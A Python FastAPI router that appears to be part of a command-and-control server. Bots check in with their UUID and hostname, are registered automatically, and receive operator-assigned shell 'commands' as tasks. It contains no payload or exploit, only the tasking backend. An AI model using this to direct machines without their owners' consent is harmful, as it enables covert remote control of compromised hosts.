from fastapi import APIRouter, HTTPException, Depends, Request
from app.models import Bot, Task, Telemetry, TaskBase
from app.repos.bots import BotRepository
from app.repos.tasks import TaskRepository
from typing import List
from uuid import UUID


router = APIRouter()


@router.post("/", response_model=TaskBase)
def check_in(
    telem: Telemetry,
    request: Request,
    repo: BotRepository = Depends(),
):
    bot = repo.get_bot(telem.uuid)
    if bot:
        task = bot.task
        if not task:
            raise HTTPException(status_code=404, detail="Task not found")
        print(f"Bot {bot.id} checked in with task: {task.command}")
        task.status = "Sent"
        task = repo.task_repo.update_task(task.id, task)
        repo.new_task(telem.uuid)
        return task
    else:
        bot = Bot(id=telem.uuid, name=telem.hostname)
        bot = repo.create_bot(bot)
        task = bot.task
        print(f"New bot {bot.id} created with task: {task.command}")
        return task


@router.get("/bots", response_model=List[Bot])
def get_all_bots(repo: BotRepository = Depends()):
    bots = repo.get_all_bots()
    return bots


@router.get("/{bot_id}", response_model=Bot)
def get_bot(bot_id: UUID, repo: BotRepository = Depends()):
    bot = repo.get_bot(bot_id)
    if bot:
        return bot
    raise HTTPException(status_code=404, detail="Bot not found")


@router.put("/{bot_id}", response_model=Bot)
def update_task(
    bot_id: UUID,
    task: Task,
    bot_repo: BotRepository = Depends(),
    task_repo: TaskRepository = Depends(),
):
    bot = bot_repo.get_bot(bot_id)

    if not bot:
        raise HTTPException(status_code=404, detail="Bot not found")
    task.status = "Pending"
    task = task_repo.update_task(bot.task.id, task)

    return bot
